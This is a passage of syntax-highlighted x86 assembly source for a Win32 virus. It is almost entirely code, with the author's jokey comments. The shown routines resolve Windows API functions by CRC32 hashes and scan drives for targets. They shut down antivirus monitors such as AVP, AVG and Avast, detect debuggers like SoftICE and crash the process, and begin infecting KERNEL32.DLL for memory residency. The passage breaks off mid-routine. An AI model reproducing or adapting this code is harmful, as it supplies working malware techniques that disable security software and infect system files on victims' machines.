        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel_base</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; kernel's base 'MZ' address in EAX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__fk32_inside</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; search functions from "k32.dll, user32.dll, advapi32.dll"</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FunctionNames</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FunctionAddresses</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">
    </span><span class="sc5">__fk32_next_library</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;number of libraries</span><span class="sc0">
    </span><span class="sc5">__fk32_next_function</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get function's CRC32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__sET_crc32</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__searchET</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">;write its address</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">       </span><span class="sc1">;next CRC32 value</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0"> </span><span class="sc1">;end of functions</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__fk32_next_function</span><span class="sc0">      </span><span class="sc1">;of current library ?</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">       </span><span class="sc1">;now, library name</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;EAX ... length of library</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__fk32_finish</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;library name</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddLoadLibraryA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,-</span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">;libraries without k32</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get number of libraries</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">user32_base</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;start of file header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__fk32_inside</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;function names</span><span class="sc0">

        </span><span class="sc1">; next library ?</span><span class="sc0">
    </span><span class="sc5">__fk32_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__fk32_next_library</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">                </span><span class="sc1">;bye, bye K32, U32, A32...</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;what a pleasure work with u!</span><span class="sc0">

        </span><span class="sc1">; search function's address</span><span class="sc0">
    </span><span class="sc5">__searchET</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__fk32_inside</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;search export table of</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;KERNEL32, searching</span><span class="sc0">
    </span><span class="sc5">__sET_next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;the names, then the ordinal</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;and, finally the RVA pointerz</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__get_CRC32</span><span class="sc0">     </span><span class="sc1">;get name's CRC32 :)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
    </span><span class="sc5">__sET_crc32</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;compare CRC32</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__sET_found</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__sET_next</span><span class="sc0">
    </span><span class="sc5">__sET_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">;ehm, save ECX through POPA</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ search fixed, cd-rom, ram-disk, etc. ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This  function  gets  information  about  disks.  I  call</span><span class="sc0">
        </span><span class="sc1">;GetDriveType function  to get type  of disk. You can  use</span><span class="sc0">
        </span><span class="sc1">;Win32API Help to know more  or WinBase.H (CBuilder, MSVC)</span><span class="sc0">
        </span><span class="sc1">;where you can see more flagz and their valuez. So, I  can</span><span class="sc0">
        </span><span class="sc1">;use GetLogicalDrives function, but that's one.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">get_disks</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__disk</span><span class="sc4">],</span><span class="sc12">'A'</span><span class="sc0">

        </span><span class="sc1">; GetDriveType function...</span><span class="sc0">
    </span><span class="sc5">__gd_search</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__disk</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetDriveTypeA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">       </span><span class="sc1">;DISK_FIXED flag</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gd_found</span><span class="sc0">

    </span><span class="sc5">__gd_new_disk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__disk</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gd_finish</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__disk</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__gd_search</span><span class="sc0">

    </span><span class="sc5">__gd_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__disk</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">          </span><span class="sc1">;convert to BCD</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__gd_new_disk</span><span class="sc0">

    </span><span class="sc5">__gd_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gdt_flags</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__disk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc13">'A:\',0
</span><span class="sc0">
</span><span class="sc1">;ÄÄÄ´ function to kill some AV monitors ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This is very interesting function how to send message  to</span><span class="sc0">
        </span><span class="sc1">;AV monitor to kill itself (AVP, AMON, AVG, AVAST monitor)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">kill_av_monitors</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kill_AV</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;address of strings</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">kill_AV_num</span><span class="sc0">     </span><span class="sc1">;three monitors</span><span class="sc0">
    </span><span class="sc5">__kam_checking</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;save counter</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;AV string</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;NULL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddFindWindowA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;found ?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">__kam_next_monitor</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;send message to AV monitor</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;to kill itself :)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000012h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddPostMessageA</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;kill it, hehe :)</span><span class="sc0">
    </span><span class="sc5">__kam_next_monitor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@endsz</span><span class="sc0">              </span><span class="sc1">;next monitor</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__kam_checking</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to kill some debuggers ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function checks whether some debuggers are active.</span><span class="sc0">
        </span><span class="sc1">;I use these methods:</span><span class="sc0">
        </span><span class="sc1">;   * IsDebuggerPresent, kill SoftICE, kill TD32, etc.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;this code has been stolen from Benny's source, hi Benny :)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">kill_debuggers</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; check standard debugger</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddIsDebuggerPresent</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc9">IFNDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;check debug...</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__kd_found</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc1">; check whether SoftICE 95/98/NT/2000 is active</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kill_SoftICE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__kd_found</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kill_SoftICE_NT</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__kd_found</span><span class="sc0">

        </span><span class="sc1">; check others debuggers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">IFNDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__kd_found</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__kd_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">         </span><span class="sc1">;im sorry :)</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to infect KERNEL32.DLL ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function have to infect "KERNEL32.DLL" to this virus</span><span class="sc0">
        </span><span class="sc1">;become memory resident.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;I would like to thank;</span><span class="sc0">
        </span><span class="sc1">;   * Lord Julus/29A for his article about this in VxTasy.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__ik_system</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;system directory</span><span class="sc0">
        </span><span class="sc5">__ik_window</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;window directory</span><span class="sc0">
        </span><span class="sc5">__ik_wininit</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'\WININIT.INI'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">__ik_nul</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'NUL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">__ik_rename</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Rename'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;section name</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">infect_kernel</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; allocate memory for SYSTEM and WINDOWS directory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">filename_size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_system</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">filename_size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_window</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; find SYSTEM directory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">filename_size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_system</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetSystemDirectoryA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; find WINDOWS directory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">filename_size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_window</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; copy \WINDOWS\SYSTEM + \KERNEL32.DLL</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel_name</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_system</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddlstrcat</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; copy \WINDOWS + \KERNEL32.DLL</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_window</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddlstrcat</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; copy KERNEL32.DLL from SYSTEM directory to '..'</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;rewrite it</span><span class="sc0">
